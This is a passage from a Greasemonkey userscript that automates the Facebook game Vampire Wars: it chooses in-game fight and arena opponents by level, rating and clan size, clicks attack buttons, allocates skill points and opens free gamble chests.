					if(opponentLevel<= GM_getValue('goodTargetsMaxLevel', '100') && opponentLevel>=GM_getValue('goodTargetsMinLevel', '1') && opponentRating<=GM_getValue('goodTargetsMaxSR', '3000') && opponentRating>=GM_getValue('goodTargetsMinSR', '1400'))
					{
						if (opponentId)
						{
							var opponentProfileArray=[opponentId,username,opponentLevel,opponentRating];
							addSavedListItem('autoFightGoodTargetsList',opponentId+',',GM_getValue('autoGoodTargetListSize',0));
						}
					}

//					if(opponentLevel<= opponentLevelMax && opponentLevel>=opponentLevelMin && opponentClan<=GM_getValue('fightClanSize', '502') && opponentClan>=GM_getValue('fightMinClanSize', '0') && opponentRating<=GM_getValue('fightClanMaxRating', '8000') && opponentRating>=GM_getValue('fightClanRating', '0'))
					if(opponentLevel<= opponentLevelMax && opponentLevel>=opponentLevelMin && opponentClan<=GM_getValue('fightClanSize', '502') && opponentClan>=GM_getValue('fightMinClanSize', '0') && opponentRating<=opponentSRTargetMax && opponentRating>=opponentSRTargetMin)
					{
						if (opponentId)
						{
							var idString = opponentId.toString();
							if (blacklist.indexOf(idString) == -1)
							{
								// Limit number of repeated attacks on same vamp in fight
								if(GM_getValue('autoFightAttackLimit', '') == "checked") {
									// See if I've attacked this target too many times
									var re = "/" + opponentId + "/g";
									re=eval(re);
									var autoFightAttackLimitListStr = GM_getValue('autoFightAttackLimitList', '').replace(/\n/g, ' ');
									var matches = autoFightAttackLimitListStr.match(re);
									if(matches!=null) {
										var previousAttackNum = matches.length;
									} else {
										var previousAttackNum = 0;
									}
								} else {
									var previousAttackNum = 0;
								}
								if(previousAttackNum<=GM_getValue('autoFightAttackLimitMax',0)){
									validOpponents.push(tmp);
								}
					        	}
						}
					}
				}
				log('Auto-Fight: Found ' + validOpponents.length + ' opponents within fight parameters on page');	
				if(validOpponents.length > 0)
				{
					var fightIndex = validOpponents[Math.floor(Math.random()*validOpponents.length)];
					var fightNode =opponents.snapshotItem(fightIndex).parentNode.parentNode.parentNode; 
					var opponentLevel =  parseInt(fightNode.innerHTML.split('Level ')[1]);
					var opponentRating = fightNode.innerHTML.split('groupsize">')[1].split('</td>')[0];
					opponentRating = opponentRating.replace(/,/g, '');
					opponentRating = parseInt(opponentRating);
					var opponentClan = parseInt(fightNode.innerHTML.split('groupsize">')[2]);
					var userurl = fightNode.getElementsByTagName('a')[0];
					var username = userurl.innerHTML;
					var userid = opponents.snapshotItem(fightIndex).value;
					// Log entry to record username, ID, Level, Clan Size, Skill of ppl who are attacked
					if (isGMChecked('logAttackEvents')) addToLog("Attacking '" + username + "' ID: " + userid + "   Level: " + opponentLevel + "   Skill: " + opponentRating + "   Clan: " + opponentClan);

					// Limit number of repeated attacks on same vamp in fight
					if(GM_getValue('autoFightAttackLimit', '') == "checked") {
						// Add the ID to the list
						addSavedListItemFIFOUnlimited('autoFightAttackLimitList',opponents.snapshotItem(fightIndex).value,GM_getValue('autoFightAttackLimitListSize'));
					}

					// Get the Opponents Attack Link.
					var formElt = xpathFirst('.//form[@id="attack_'+userid+'"]', fightNode);
					var submitElt = xpathFirst('.//input[@type="submit"]', formElt);
					if (!submitElt) {
					    log('Can\'t find attack link to click. ');
					    return true;
					}

					// Attack!
					Autoplay.fx = function() {
					    clickAction = 'attack';
					    clickElement(submitElt);
					    log('Attacking');
					};
					Autoplay.delay = delay;
					Autoplay.start();


				} else {
					setTimeout("document.location ='" + "http://apps.facebook.com/"+SCRIPT.name+"/fight.php"+"'", delay);
				}
			} else {
				setTimeout("document.location ='" + "http://apps.facebook.com/"+SCRIPT.name+"/fight.php"+"'", delay);
			}

		}


		// Add log to point out fighting by list
		if(GM_getValue('rFightList', '') == "checked")
		{
			log('Fighting mode: List');	
//                        setTimeout("document.location = '"+"http://apps.facebook.com/"+SCRIPT.name+"/fight.php?opponent_id="+parseInt(GM_getValue('fightList', ''))+"&action=attack"+"'", delay);

			// Create the Opponents Attack Element:
			var autoAttackFightListEle = makeElement('div', document.body,{'id':'autoAttackFightListEle'});
				autoAttackFightListEle.setAttribute("style", "position: absolute; left: 0px; top: 0px;  width: 100px; height: 100px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 10pt; text-align: left; padding: 5px; border: 1px dotted; visibility: hidden; z-index: 100;");
				autoAttackFightListEle.innerHTML = "Auto Attack Box - Fight Specific Opponent:<br>\
					<form action=\"fight.php\" method=\"post\" onsubmit=\"submitForm('mainDiv', 'fight.php', this,'TopField'); return false;\" id=\"attack_"+parseInt(GM_getValue('fightList', ''))+"\"><input type=\"hidden\" value=\""+parseInt(GM_getValue('fightList', ''))+"\" name=\"opponent_id\">\
					<input type=\"hidden\" name=\"action\" value=\"attack\">\
					<input type=\"submit\" value=\"Attack\" class=\"sysbutton_h28 w77xh28\" />\
					</form>";
			// Get the Opponents Attack Link.
			var formElt = xpathFirst('.//form[@id="attack_'+parseInt(GM_getValue('fightList', ''))+'"]', autoAttackFightListEle);
			var submitElt = xpathFirst('.//input[@type="submit"]', formElt);
			if (!submitElt) {
			    log('Can\'t find attack link to click. ');
			    return true;
			}

			// Attack!
			Autoplay.fx = function() {
			    clickAction = 'attack';
			    clickElement(submitElt);
			    log('Attacking');
			};
			Autoplay.delay = delay;
			Autoplay.start();
                }
	}
}


function DoArena(){

	if(GM_getValue('fightArena', '') != "checked" || rage <= GM_getValue('fightKeepRage', 0) || (GM_getValue('autoHeal', '') == "checked" && health < GM_getValue('healthLevel', 0)) || (GM_getValue('paused')!=0))
	{
		log('Auto-Fight ARENA: ' + GM_getValue('fightArena', ''));	
		log('Fight Keep Rage: ' + GM_getValue('fightKeepRage', 0) + ' of ' + rage);
		log('Paused: ' + GM_getValue('paused'));
		return;
	}

	log('Autoplayer autoFight ARENA ' + rage);	
	if(health>19){
		// log('Autoplayer Health: ' + health);	
		if(GM_getValue('fightArena', '') == "checked") {
    		// log('Fighting mode: Arena');	

			if (location.href.indexOf('/arena.php') != -1)
			{
				// Gather useful page elements
				var arenaListBlockDiv = document.evaluate("//div[@class='arenaListBlock']", document,null,9,null).singleNodeValue;
				var arenaStatBlockDiv = document.evaluate("//div[@class='statBlock']", document,null,9,null).singleNodeValue;

//				var arenaListTimerRefresh = xpathFirst('//span[@id="arenaListTimer"]', arenaListBlockDiv).innerHTML;
////				var arenaListTimerRefresh = xpathFirst('//span[@id="sale_timer"]', arenaListBlockDiv).innerHTML;
//
//				setGMTime('arenaListTimerRefresh', arenaListTimerRefresh);
				var myArenaAttackSkill = parseInt(xpathFirst('//div[@class="attack"]//span[@class="statText"]', arenaStatBlockDiv).innerHTML.replace(/,/g, ''));
				var myArenaDefenseSkill = parseInt(xpathFirst('//div[@class="defend"]//span[@class="statText"]', arenaStatBlockDiv).innerHTML.replace(/,/g, ''));

				var myArenaSR = parseInt(xpathFirst('//div[@class="statItem"]//span[@class="statText"]', arenaStatBlockDiv).innerHTML.replace(/,/g, ''));
				GM_setValue('mySkillRankingArena',myArenaSR);
				refreshStatsBox();

				var arenaListCurrentPageInputElt = xpathFirst('//input[@name="listId" and @class="listIdBox"]', arenaListBlockDiv);
				var arenaListCurrentPageNumber = parseInt(arenaListCurrentPageInputElt.value.replace(/,/g, ''));
				var arenaListMinPage = 1;
				var arenaListMaxPage = parseInt(xpathFirst('//div[@class="rangeText"]', arenaListBlockDiv).innerHTML.split('to ')[1].replace(/,/g, ''));

				var arenaListPageUpLink = xpathFirst('//div[@class="leftArrow"]//a[contains(@href,"/arena.php")]', arenaListBlockDiv);
				var arenaListPageDownLink = xpathFirst('//div[@class="rightArrow"]//a[contains(@href,"/arena.php")]', arenaListBlockDiv);
				
				// "opponents" will include All targets on the page, including zombie, dead, active, etc...
				var opponents  = document.evaluate("//div[@class='list']//table[@class='listTable']//input[@class='sysbutton_h28 w77xh28' and @type='submit']",document,null,XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,null);//.singleNodeValue;
				// (Loop code borrowed from StevenD's Mafia Wars script - Thanks Liquidor for the loop code)

				var validOpponents = [];
				var maxArenaPageSR = -100000;
				var maxArenaPageSRIndex = -1;
				var minArenaPageSR = 100000;
				var minArenaPageSRIndex = -1;
				var maxArenaPageLevel = -1;
				var maxArenaPageLevelIndex = -1;
				var minArenaPageLevel = 100000;
				var minArenaPageLevelIndex = -1;
				var maxArenaPageClan = -1;
				var maxArenaPageClanIndex = -1;
				var minArenaPageClan = 100000;
				var minArenaPageClanIndex = -1;

				// Calculate my target level range
				var opponentLevelMax = parseInt(GM_getValue('fightArenaLevel', 100));
				var opponentLevelMin = parseInt(GM_getValue('fightArenaMinLevel', 0));

				// Make any relative adjustments (if enabled).
				if (GM_getValue('fightLevelRelative', false) == "checked") {
				  opponentLevelMax = opponentLevelMax + level;
				  opponentLevelMin = level - opponentLevelMin;
				}

				// Calculate my target SR range
				var opponentSRTargetMax = parseInt(GM_getValue('fightArenaMaxRating', 0));
				var opponentSRTargetMin = parseInt(GM_getValue('fightArenaRating', 0));

				// Make any relative adjustments (if enabled).
				if (GM_getValue('fightArenaRatingRelative', false) == "checked") {
				  opponentSRTargetMax = opponentSRTargetMax + parseInt(GM_getValue('mySkillRankingArena',0));
				  opponentSRTargetMin = parseInt(GM_getValue('mySkillRankingArena',0)) - opponentSRTargetMin;
				}




//				addToLog('blacklistArena='+blacklistArena);


				

				for (tmp = 0; tmp < opponents.snapshotLength; tmp++)
				{
					var fightNode =opponents.snapshotItem(tmp).parentNode.parentNode.parentNode; 
					var opponentLevel =  fightNode.getElementsByTagName('td')[3].innerHTML;
					opponentLevel = opponentLevel.replace(/,/g, '');
					opponentLevel = parseInt(opponentLevel);
					var opponentRating = fightNode.getElementsByTagName('td')[2].innerHTML;
					opponentRating = opponentRating.replace(/,/g, '');
					opponentRating = parseInt(opponentRating);
					var userurl = fightNode.getElementsByTagName('td')[1].getElementsByTagName('a')[0];
					var opponentId = userurl.href.split('stats.php?user=')[1];
					var opponentClan = parseInt(fightNode.innerHTML.split('<td class="center background">')[3].split('</td>')[0]);
					var username = userurl.innerHTML.split('">')[1].split('</span>')[0];

					var opponentAttackButtonValue = opponents.snapshotItem(tmp).value;

					/*
					if(tmp==0) {
						alert('opponentLevel='+opponentLevel+'\
						opponentRating='+opponentRating+'\
						userurl='+userurl+'\
						opponentId='+opponentId+'\
						opponentClan='+opponentClan+'\
						username='+username+'\
						opponentAttackButtonValue='+opponentAttackButtonValue);
					}
					*/

					//Gather max and min SR on the page
					if(opponentRating>maxArenaPageSR) {
						maxArenaPageSR = opponentRating;
						maxArenaPageSRIndex = tmp;
					}
					if(opponentRating<minArenaPageSR) {
						minArenaPageSR = opponentRating;
						minArenaPageSRIndex = tmp;
					}

					//Gather max and min Level on the page
					if(opponentLevel>maxArenaPageLevel) {
						maxArenaPageLevel = opponentLevel;
						maxArenaPageLevelIndex = tmp;
					}
					if(opponentLevel<minArenaPageLevel) {
						minArenaPageLevel = opponentLevel;
						minArenaPageLevelIndex = tmp;
					}

					//Gather max and min clan on the page
					if(opponentClan>maxArenaPageClan) {
						maxArenaPageClan = opponentClan;
						maxArenaPageClanIndex = tmp;
					}
					if(opponentClan<minArenaPageClan) {
						minArenaPageClan = opponentClan;
						minArenaPageClanIndex = tmp;
					}

					/*
					if(tmp==0) {
						alert('opponentLevel='+opponentLevel+'\
						opponentLevelMax='+opponentLevelMax+'\
						opponentLevelMin='+opponentLevelMin+'\
						opponentClan='+opponentClan+'\
						fightClanSize='+GM_getValue('fightClanSize', '502')+'\
						fightMinClanSize='+GM_getValue('fightMinClanSize', '502')+'\
						opponentRating='+opponentRating+'\
						opponentSRTargetMax='+opponentSRTargetMax+'\
						opponentSRTargetMin='+opponentSRTargetMin);
					}
					*/

					if(opponentAttackButtonValue == "Attack" && opponentLevel<= opponentLevelMax && opponentLevel>=opponentLevelMin && opponentClan<=GM_getValue('fightClanSize', '502') && opponentClan>=GM_getValue('fightMinClanSize', '0') && opponentRating<=opponentSRTargetMax && opponentRating>=opponentSRTargetMin)
					{
						if (opponentId)
						{
							var idString = opponentId.toString();
							if (blacklistArena.indexOf(idString) == -1)
							{
								// Limit number of repeated attacks on same vamp in fight
								if(GM_getValue('autoFightAttackLimit', '') == "checked") {
									// See if I've attacked this target too many times
									var re = "/" + opponentId + "/g";
									re=eval(re);
									var autoFightAttackLimitListStr = GM_getValue('autoFightAttackLimitList', '').replace(/\n/g, ' ');
									var matches = autoFightAttackLimitListStr.match(re);
									if(matches!=null) {
										var previousAttackNum = matches.length;
									} else {
										var previousAttackNum = 0;
									}
								} else {
									var previousAttackNum = 0;
								}
								if(previousAttackNum<=GM_getValue('autoFightAttackLimitMax',0)){
									validOpponents.push(tmp);
								}
					        	}
						}
					}
				}

				//alert('validOpponents='+validOpponents);
				//alert('maxArenaPageSR='+maxArenaPageSR+' maxArenaPageSRIndex='+maxArenaPageSRIndex+' minArenaPageSR='+minArenaPageSR+' minArenaPageSRIndex='+minArenaPageSRIndex);

				if(validOpponents.length > 0)
				{
					var fightIndex = validOpponents[Math.floor(Math.random()*validOpponents.length)];

					var fightNode =opponents.snapshotItem(fightIndex).parentNode.parentNode.parentNode; 
					var opponentLevel =  fightNode.getElementsByTagName('td')[3].innerHTML;
					opponentLevel = opponentLevel.replace(/,/g, '');
					opponentLevel = parseInt(opponentLevel);
					var opponentRating = fightNode.getElementsByTagName('td')[2].innerHTML;
					opponentRating = opponentRating.replace(/,/g, '');
					opponentRating = parseInt(opponentRating);
					var userurl = fightNode.getElementsByTagName('td')[1].getElementsByTagName('a')[0];
					var opponentId = userurl.href.split('stats.php?user=')[1];
					var opponentClan = parseInt(fightNode.innerHTML.split('<td class="center background">')[3].split('</td>')[0]);
					var username = userurl.innerHTML.split('">')[1].split('</span>')[0];

					var opponentAttackButton = opponents.snapshotItem(fightIndex);

					// Log entry to record username, ID, Level, Clan Size, Skill of ppl who are attacked
					if (isGMChecked('logAttackEvents')) addToLog("ARENA: Attacking '" + username + "' ID: " + opponentId + "   Level: " + opponentLevel + "   Skill: " + opponentRating + "   Clan: " + opponentClan);

					// Limit number of repeated attacks on same vamp in fight
					if(GM_getValue('autoFightAttackLimit', '') == "checked") {
						// Add the ID to the list
						addSavedListItemFIFOUnlimited('autoFightAttackLimitList',opponents.snapshotItem(fightIndex).value,GM_getValue('autoFightAttackLimitListSize'));
					}

					// Get the Opponents Attack Link.
					if (!opponentAttackButton) {
					    log('Can\'t find arena attack link to click. ');
					    return true;
					}

					// Attack!
					Autoplay.fx = function() {
					    clickAction = 'arena_attack';
					    clickElement(opponentAttackButton);
					    log('Attacking (Arena)');
					};
					Autoplay.delay = delay;
					Autoplay.start();

				} else {
					// Am I on the right page? (i.e. Can my target SR, level, and clan be found on the page?)

					//alert('Level: Page='+minArenaPageLevel+'-'+maxArenaPageLevel+' Target='+opponentLevelMin+'-'+opponentLevelMax+'<br>Clan: Page='+minArenaPageClan+'-'+maxArenaPageClan+' Target='+GM_getValue('fightMinClanSize', '0')+'-'+GM_getValue('fightClanSize', '502')+'<br>SR: Page='+minArenaPageSR+'-'+maxArenaPageSR+' Target='+opponentSRTargetMin+'-'+opponentSRTargetMax);

					if(((minArenaPageLevel > opponentLevelMax && minArenaPageLevel > opponentLevelMin) || (minArenaPageClan > GM_getValue('fightClanSize', '502') && minArenaPageClan > GM_getValue('fightMinClanSize', '0')) || (minArenaPageSR > opponentSRTargetMax && minArenaPageSR > opponentSRTargetMin)) && arenaListCurrentPageNumber<arenaListMaxPage) {
						// These opponents are too tough for my parameters - go down a page and try again.
						if (!arenaListPageDownLink) {
						    log('Can\'t find page down link to click. ');
						    return true;
						}

						// Page Down
						Autoplay.fx = function() {
						    clickAction = 'arena_page_down';
						    clickElement(arenaListPageDownLink);
						    addToLog('Arena - Paging down for weaker opponents');
						    log('Arena - Paging down for weaker opponents');
						};
						Autoplay.delay = delay;
						Autoplay.start();
					} else if (((maxArenaPageLevel < opponentLevelMax && maxArenaPageLevel < opponentLevelMin) || (maxArenaPageClan < GM_getValue('fightClanSize', '502') && maxArenaPageClan < GM_getValue('fightMinClanSize', '0')) || (maxArenaPageSR < opponentSRTargetMax && maxArenaPageSR < opponentSRTargetMin)) && arenaListCurrentPageNumber>arenaListMinPage) {
						// arenaListPageUpLink
						// These opponents are too weak for my parameters - go up a page and try again.
						if (!arenaListPageUpLink) {
						    log('Can\'t find page up link to click. ');
						    return true;
						}

						// Page Down
						Autoplay.fx = function() {
						    clickAction = 'arena_page_up';
						    clickElement(arenaListPageUpLink);
						    addToLog('Arena - Paging up for tougher opponents');
						    log('Arena - Paging up for tougher opponents');
						};
						Autoplay.delay = delay;
						Autoplay.start();
					} else {
						// If I can find valid ranges, but none are alive, I'm on the right page, I just need to reload (or wait for List Refresh)
						setTimeout("document.location ='" + "http://apps.facebook.com/"+SCRIPT.name+"/arena.php"+"'", delay);
					}
				}
			} else {
				setTimeout("document.location ='" + "http://apps.facebook.com/"+SCRIPT.name+"/arena.php"+"'", delay);
			}
		}
	}
}


function UpdateStats(){

	setGMTime('goToStatsTimer', goToStatsInterval);

// Collect the Vamp Name
	try {
		var profileHeaderDiv = document.getElementById('profile-header');
		var profileTitleDiv = xpathFirst('//div[@id="profile_title"]', profileHeaderDiv);
		var playerVampName = xpathFirst('//span[@class="name"]//span', profileTitleDiv).innerHTML;
		GM_setValue('playerVampName', playerVampName);
		//alert('Vamp Name = '+playerVampName);
	}
	catch(e){}

// Collect number of boosts from Stats page for display in Quick Links box:
	var BoostsList = document.getElementById('boosts_tab').innerHTML;
	if (BoostsList.indexOf("50% Rage Boost") != -1){
		var numRageBoosts = BoostsList.split('50% Rage Boost')[1].split('"amount">× ')[1];
		numRageBoosts = parseInt(numRageBoosts);
	} else {
		var numRageBoosts = 0;
	}
	GM_setValue('numRageBoosts', numRageBoosts);

	if (BoostsList.indexOf("50% Energy Boost") != -1){
		var numFiftyNrgBoosts = BoostsList.split('50% Energy Boost')[1].split('"amount">× ')[1];
		numFiftyNrgBoosts = parseInt(numFiftyNrgBoosts);
	} else {
		var numFiftyNrgBoosts = 0;
	}
	GM_setValue('numFiftyNrgBoosts', numFiftyNrgBoosts);

	if (BoostsList.indexOf("50% Health Boost") != -1){
		var numHealthBoosts = BoostsList.split('50% Health Boost')[1].split('"amount">× ')[1];
		numHealthBoosts = parseInt(numHealthBoosts);
	} else {
		var numHealthBoosts = 0;
	}
	GM_setValue('numHealthBoosts', numHealthBoosts);

	if (BoostsList.indexOf("100% Energy Boost") != -1){
		var numHundredNrgBoosts = BoostsList.split('100% Energy Boost')[1].split('"amount">× ')[1];
		numHundredNrgBoosts = parseInt(numHundredNrgBoosts);
	} else {
		var numHundredNrgBoosts = 0;
	}
	GM_setValue('numHundredNrgBoosts', numHundredNrgBoosts);

	// Grab and save my current number of clan and Skill Rating
	// While we're here on the Stats page we might as well grab the Skill Ranking and store it.
	var profileStatsTDs = document.getElementById('profile_stats').getElementsByTagName('td');
	for (var i=0;i<profileStatsTDs.length;i++)
		if(profileStatsTDs[i].innerHTML.indexOf('Skill Ranking')!= -1){
			var mySkillRanking = profileStatsTDs[i].parentNode.getElementsByTagName('td')[1].innerHTML.split(',').join('').toInt();
			i=profileStatsTDs.length;
		}
	//alert('mySkillRanking='+mySkillRanking);
	if (isUndefined('mySkillRanking')) {
		GM_setValue('mySkillRanking',0);
	} else {
		GM_setValue('mySkillRanking',mySkillRanking);
		refreshStatsBox();
	}

	// Also grab the Arena Stats.
	var arenaStatsTDs = document.getElementById('arena_stats').getElementsByTagName('td');
	for (var i=0;i<arenaStatsTDs.length;i++)
		if(arenaStatsTDs[i].innerHTML.indexOf('Arena Ranking')!= -1){
			var mySkillRankingArena = arenaStatsTDs[i].parentNode.getElementsByTagName('td')[1].innerHTML.split(',').join('').toInt();
			i=arenaStatsTDs.length;
		}
	//alert('mySkillRankingArena='+mySkillRankingArena);
	if (isUndefined('mySkillRankingArena')) {
		GM_setValue('mySkillRankingArena',0);
	} else {
		GM_setValue('mySkillRankingArena',mySkillRankingArena);
		refreshStatsBox();
	}

	if(GM_getValue('autoStats', '') != "checked" ||  (GM_getValue('paused')!=0)) //level==GM_getValue('currentlevel', 1) ||
		return;

	// Upgrade Stats

	var skillpoints = document.evaluate("//div[@id='skills_header']//span[@class='pointsleft']//span[@class='highlight']", document,null,9,null).singleNodeValue;
	if(skillpoints==null)
		return;

	skillpoints = parseInt(skillpoints.innerHTML);
	log('Autoplayer UpdateStats '+skillpoints);

	var maxEnergy = parseInt(document.evaluate("//span[@class='name max_energy']", document,null,9,null).singleNodeValue.parentNode.innerHTML.split('</span>')[1].replace(/,/g, ''));
	var maxRage = parseInt(document.evaluate("//span[@class='name max_stamina']", document,null,9,null).singleNodeValue.parentNode.innerHTML.split('</span>')[1].replace(/,/g, ''));
	var curAttack = parseInt(document.evaluate("//span[@class='name attack']", document,null,9,null).singleNodeValue.parentNode.innerHTML.split('</span>')[1].replace(/,/g, ''));
	var curDefense = parseInt(document.evaluate("//span[@class='name defense']", document,null,9,null).singleNodeValue.parentNode.innerHTML.split('</span>')[1].replace(/,/g, ''));
	var maxHealth = parseInt(document.evaluate("//span[@class='name max_health']", document,null,9,null).singleNodeValue.parentNode.innerHTML.split('</span>')[1].replace(/,/g, ''));
	var allocateSkillPointsButton = xpathFirst('//input[@class="sysbutton_h28 w128xh28" and @value="Allocate Skill Points"]', innerPageElt);


	// Stat Allocation code borrowed from MWAP
	// Array containers for status settings
	var curStats = [maxEnergy,maxRage,curAttack,curDefense,maxHealth];
	var modeStats = [level,maxEnergy,maxRage,curAttack,curDefense,maxHealth];
	var statFallbacks = new Array(curStats.length);

	var maxPtDiff = 0;
	var statIndex = 0;
	var statPrio = autoStatPrios.length;
	for (var i = 0, iLength = curStats.length; i < iLength; ++i) {
    	  // Calculate the Points needed to reach target stat
	  var ratio = new Number(GM_getValue(autoStatRatios[i]));
	  var base = new Number(GM_getValue(autoStatBases[i]));
	  var curStatPrio = new Number(GM_getValue(autoStatPrios[i]));
	  var curStatDiff = Math.max (0, ratio * modeStats[GM_getValue(autoStatModes[i])] + base - curStats[i]);

	  // Account for priority
	  if ((curStatDiff > 0 && curStatPrio < statPrio) || (curStatDiff > maxPtDiff && curStatPrio <= statPrio)) {
	    maxPtDiff = curStatDiff;
	    statIndex = i;
	    statPrio = curStatPrio;
	  }

	  // Fallback method
	  statFallbacks[i] = isGMChecked(autoStatFallbacks[i]) ? i : '';
	}

	// Disable auto-stat when status goals are reached and autoStatDisable is checked
	if (maxPtDiff <= 0 && isGMChecked('autoStatDisable')) {
	  addToLog('Auto-Stats: All goals met, please update your goals.');
	  GM_setValue('autoStats', 0);
	  return;
	}

	// Increment the status corresponding to the nextStat variable (fallback)
	if (maxPtDiff <= 0) {
	  if (statFallbacks.join('') != '') {
	    log('Auto-Stats: Goals reached, using fallback method.');
	    var nextStat = parseInt(GM_getValue('nextStat', ATTACK_STAT));

	    // Search for next Stat to increment
	    while (statFallbacks.indexOf(nextStat) == -1)
	      nextStat = (nextStat + 1) % curStats.length;

	    log('Next stat in fallback mode: ' + autoStatDescrips[nextStat + 1]);
	    statIndex = nextStat;
	    maxPtDiff = skillpoints;
	  } else {
	    // Do not attempt to autostat until next level up
	    log('Auto-Stats: Goals reached, waiting till next level up.');
	    GM_setValue('restAutoStat', 1);
	    return false;
	  }
	} else {
	  log('Next stat to increment : ' + autoStatDescrips[statIndex + 1] + ' (' + maxPtDiff + ' points to goal) ');
	  GM_setValue('restAutoStat', 0);
	}

	// Add stats to the attribute farthest from the goal
	// (or the nextStat if fallback kicked in)
	var upgradeKey;
	var upgradeText;
	switch (statIndex) {
	  case ENERGY_STAT:
	  	upgradeKey = 'max_energy';
	  	upgradeText = 'Energy';
	  	break;
	  case RAGE_STAT:
	  	upgradeKey = 'max_stamina';
	  	upgradeText = 'Rage';
	  	break;
	  case ATTACK_STAT:
	  	upgradeKey = 'attack';
	  	upgradeText = 'Attack';
	  	break;
	  case DEFENSE_STAT:
	  	upgradeKey = 'defense';
	  	upgradeText = 'Defense';
	  	break;
	  case HEALTH_STAT:
	  	upgradeKey = 'max_health';
	  	upgradeText = 'Health';
	  	break;

	  default             :
	    // Disable auto-stats when maxPts calculated is NaN
	    GM_setValue('autoStats', 0);
	    addToLog('BUG DETECTED: Invalid calculated maxPts value "' + maxPts + '". Auto-stat disabled.');
	    return false;
	}

	if (allocateSkillPointsButton) {
		log('Auto-Stats: Clicking Allocate Skill Points Button to initiate stats upgrade');
		clickElement(allocateSkillPointsButton);
		var pointsToAdd = Math.min(skillpoints,maxPtDiff);
		addToLog('Auto-Stats: Upgrading '+upgradeText+' by '+pointsToAdd+' point(s)');

		Autoplay.fx = function() {
			handleStatsUpgrade(upgradeKey,pointsToAdd);
		};
		Autoplay.delay = 900;
		Autoplay.start();
		return;

	}
}

function handleStatsUpgrade(skill,points) {
	
	var upgradeElt = xpathFirst('//label[@for="'+skill+'"]//span[@class="arrows"]//span[@class="up"]');

	if (!upgradeElt){
	  log('Couldnt find link to upgrade stat.');
	  return false;
	}

	try {
	  var updatePointsElt = xpathFirst('//input[@id="updatepoints"]');

	  if(upgradeElt) {
	    for(var i=0; i<points; i++)
	      clickElement(upgradeElt);

	    if(updatePointsElt) {
	      Autoplay.fx = function() {
		clickAction = 'update_points';
		clickElement(updatePointsElt);
		log('Auto-Stats: Clicking Allocate Skill Points Button to apply points');
	      };
	      Autoplay.delay = 900;
	      Autoplay.start();
	    } else {
	      log("Can't find updatePointsElt");
	    }

	  }
	  setGMTime('goToStatsTimer', '00:00');
	}
	catch (e){ GM_log(e);}
	return true;
}


function UpdateAbilityPage(){
	if(GM_getValue('autoAbility', '') != "checked" || GM_getValue('paused')!=0 )
		return;
	log('UpdateAbilityPage');

	for (var index = 1 ; index < 18; index++){
		var ability = document.evaluate("//div[@id='app25287267406_improve_ability_"+index+"']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
		if(ability.snapshotLength==0)
			continue;
		var forms = ability.snapshotItem(0).getElementsByTagName('form');		
		
		if(forms.length==2){
			setTimeout(function(){forms[0].submit();},delay);
			return;
		}
	}
}


function UpdateComments(){
	log('UpdateComments');

	var commentors = document.evaluate("//td[@class='comment_text']//li[@class='title']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	for (var index = 0 ; index < commentors.snapshotLength; index++){
		var aEle = commentors.snapshotItem(index).getElementsByTagName('a')[0];
		var commentorUserID = aEle.getAttribute('href').split('user=')[1].split('"')[0];
		var spanEle = commentors.snapshotItem(index).getElementsByTagName('span')[0];
		spanEle.appendChild(document.createTextNode('   |   '));
		makeElement('a', spanEle, {'style':'font-size: 10px;','onclick':'return do_ajax("mainDiv", "stats.php?user='+commentorUserID+'");','href':'http://apps.facebook.com/vampiresgame/stats.php?user='+commentorUserID})
		    .appendChild(document.createTextNode('(Stats)'));
	}
}


function DoAkemsGamble(){
	//autoGamble logic
	if((GM_getValue('autoGamble', '') != "checked") || (GM_getValue('paused')!=0))
		return;
	log('Autoplayer autoGamble');




// Standard Akem's Gamble:
//	if(document.body.innerHTML.indexOf("Or come back in")!=-1){
//		LotteryDue =  parseInt(document.body.innerHTML.split('Or come back in ')[1]);




//alert(document.getElementById('akemGamble').innerHTML.split('Free Gamble in:')[1].split('class="bad">')[1]);



// Death Gods Special Event:
//	if(document.body.innerHTML.indexOf("Free Gamble in:")!=-1){
//	if(document.getElementById('akemGamble').innerHTML.split('Free Gamble in:')[1].split('class="bad">')[1].indexOf("NOW")==-1){
	if(xpathFirst('//div[@class="gambleFlavor"]', innerPageElt).innerHTML.split('Free Gamble in:')[1].split('class="bad">')[1].indexOf("NOW")==-1){
		LotteryDueDHMS =  document.getElementById('akemGamble').innerHTML.split('Free Gamble in:')[1].split('class="bad">')[1].split('</span>')[0];
		LotteryDue = (LotteryDueDHMS.split('d')[0] * 86400) + (LotteryDueDHMS.split('d')[1].split(':')[0] * 3600) + (LotteryDueDHMS.split(':')[1] * 60) + (LotteryDueDHMS.split(':')[2]*1);

		log('Autoplayer autoGamble: Next free gamble: '+LotteryDueDHMS);
	        addToLog('Autoplayer autoGamble: Next free gamble: '+LotteryDueDHMS);


		GM_setValue('busy',0);
		var now = Math.floor(new Date().getTime() / 1000);
		//time = time + 60 *(1+ parseInt(messagebox.innerHTML.split('hours and')[1]));
// Standard Akem's Gamble:
//		GM_setValue('LotteryDue',now + 3600 * LotteryDue );
// Death Gods Special Event:
		GM_setValue('LotteryDue',now + LotteryDue );
		document.location = 'http://apps.facebook.com/'+SCRIPT.name+ GM_getValue('refreshPage', "/index.php");
	}
	else{//Free 24hr gamble
		log('Autoplayer autoGamble - Free 24hr gamble');
		if (GM_getValue('rBoxLeft')=='checked') BoxToOpen=1;
		else if (GM_getValue('rBoxMiddle')=='checked') BoxToOpen=2;
		else 	BoxToOpen=3;
		if(GM_getValue('busy', 0) != 1){
			// Get the Chest link.

// Standard Akem's Gamble:
//			elt = xpathFirst('.//div[@id="box_'+BoxToOpen+'_link"]//a[contains(@href,"action=gamble&chest='+BoxToOpen+'")]', innerPageElt);


// Death Gods Special Event:
			elts = $x('.//div[@class="gambleChests"]//a[contains(@href,"lottery.php?action=roll")]', innerPageElt);
			elt = elts[BoxToOpen-1];



			if (!elt) {
			    log('Can\'t find chest link to click. ');
			} else {

				// Open the chest.
				Autoplay.fx = function() {
				    clickAction = 'open';
				    clickElement(elt);
				    log('Free gamble, opening Chest no. '+BoxToOpen+'.');
				};
				Autoplay.start();

				addToLog("Free gamble, opening Chest no. "+BoxToOpen+".");
			}
		}
		GM_setValue('busy',1);
		
	
//// Fixed logging the spoils from Akem's Gamble:
